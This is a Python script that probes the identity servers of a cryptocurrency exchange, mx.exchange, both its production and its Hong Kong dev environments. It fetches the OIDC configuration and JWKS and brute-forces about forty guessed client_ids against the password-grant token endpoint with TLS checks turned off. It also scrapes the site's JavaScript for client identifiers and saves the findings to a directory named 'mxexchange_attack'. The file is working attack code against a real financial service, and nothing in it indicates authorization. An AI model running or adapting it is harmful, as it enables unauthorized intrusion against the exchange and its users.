import requests, json, sys, urllib3
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
T = 20
H = {"Accept":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

def safe(t, n=500):
    return t[:n].encode('ascii','replace').decode('ascii') if t else ""

results = {}

# 1. OIDC FULL CONFIG
print("=" * 70)
print("OIDC + CLIENT_ID HUNT")
print("=" * 70)

for env, base in [("HK_DEV", "https://identityhkdev.mx.exchange"), ("PROD", "https://identity.mx.exchange")]:
    print(f"\n--- {env} OIDC CONFIG ---")
    r = requests.get(f"{base}/.well-known/openid-configuration", headers=H, timeout=T, verify=False)
    if r.status_code == 200:
        cfg = r.json()
        results[f"{env}_oidc"] = cfg
        print(json.dumps(cfg, indent=2))
        
        # Get JWKS
        jwks_uri = cfg.get("jwks_uri", "")
        if jwks_uri:
            r2 = requests.get(jwks_uri, headers=H, timeout=T, verify=False)
            if r2.status_code == 200:
                print(f"\n  JWKS: {safe(r2.text, 500)}")
                results[f"{env}_jwks"] = r2.json()

# 2. Try known IdentityServer4 client_ids
print(f"\n\n--- CLIENT_ID BRUTE ---")
client_ids = [
    "web", "webapp", "spa", "angular", "react", "frontend", 
    "mx.exchange", "mxexchange", "mx-exchange", "mx_exchange",
    "mx.web", "mx.spa", "mx.client", "mx.app", "mx",
    "client", "public", "web-client", "web_client",
    "orca", "orca-admin", "admin", "orca-web",
    "openapi", "api", "api-client", "mobile",
    "ro.client", "resourceowner", "resource_owner",
    "password", "ropc", "implicit",
    "trading", "exchange", "wallet",
    "MxExchange.Web", "MxExchange.App", "MxExchange.Api",
    "MxExchange.Mobile", "MxExchange.Admin", "MxExchange",
]

EMAIL = "testuser@gmail.com"
PASS = "TestPass123!@#"

for env, base in [("HK_DEV", "https://identityhkdev.mx.exchange"), ("PROD", "https://identity.mx.exchange")]:
    print(f"\n  --- {env} ---")
    for cid in client_ids:
        data = {
            "grant_type": "password",
            "client_id": cid,
            "username": EMAIL,
            "password": PASS,
            "scope": "openid",
        }
        try:
            r = requests.post(f"{base}/connect/token", data=data, 
                            headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"},
                            timeout=T, verify=False)
            if r.status_code == 200:
                print(f"  [!!!] client_id={cid} => 200 {safe(r.text, 500)}")
                results[f"{env}_token_{cid}"] = r.json()
                break
            elif "invalid_client" not in r.text:
                print(f"  [?] client_id={cid} => {r.status_code} {safe(r.text, 200)}")
        except:
            continue

# 3. Fetch app.mx.exchange frontend to find client_id in JS
print(f"\n\n--- APP FRONTEND JS SCAN ---")
try:
    r = requests.get("https://app.mx.exchange/", headers=H, timeout=T, verify=False)
    if r.status_code == 200:
        # Find JS file references
        import re
        scripts = re.findall(r'src="([^"]*\.js[^"]*)"', r.text)
        print(f"  Found {len(scripts)} JS files")
        for s in scripts[:20]:
            print(f"    {s}")
        
        # Also check inline for client_id patterns
        for pattern in [r'client_id["\s:=]+["\']([^"\']+)', r'clientId["\s:=]+["\']([^"\']+)', 
                       r'CLIENT_ID["\s:=]+["\']([^"\']+)', r'authority["\s:=]+["\']([^"\']+)']:
            matches = re.findall(pattern, r.text)
            if matches:
                print(f"  FOUND in HTML: {pattern} => {matches}")
        
        # Fetch each JS file and search for client_id
        for js_url in scripts[:10]:
            if js_url.startswith("/"):
                js_url = f"https://app.mx.exchange{js_url}"
            elif not js_url.startswith("http"):
                js_url = f"https://app.mx.exchange/{js_url}"
            
            if "tradingView" in js_url or "challenges.cloudflare" in js_url:
                continue
                
            try:
                r2 = requests.get(js_url, headers=H, timeout=T, verify=False)
                if r2.status_code == 200:
                    text = r2.text
                    for pattern in [r'client_id["\s:=\']+([^"\'&\s]+)', r'clientId["\s:=\']+([^"\'&\s]+)',
                                   r'CLIENT_ID["\s:=\']+([^"\'&\s]+)', r'authority["\s:=\']+([^"\'&\s]+)',
                                   r'identit[y]["\s:=\']+([^"\'&\s]+)', r'oidc["\s:=\']+([^"\'&\s]+)',
                                   r'connect/token', r'connect/authorize']:
                        matches = re.findall(pattern, text)
                        if matches:
                            print(f"  [{js_url.split('/')[-1][:30]}] {pattern[:30]} => {matches[:5]}")
            except:
                continue
except Exception as e:
    print(f"  ERROR: {e}")

# Save
with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\oidc_results.json", "w") as f:
    json.dump(results, f, indent=2, ensure_ascii=True)

print(f"\n{'='*70}")
print(f"Results saved. {len(results)} items.")
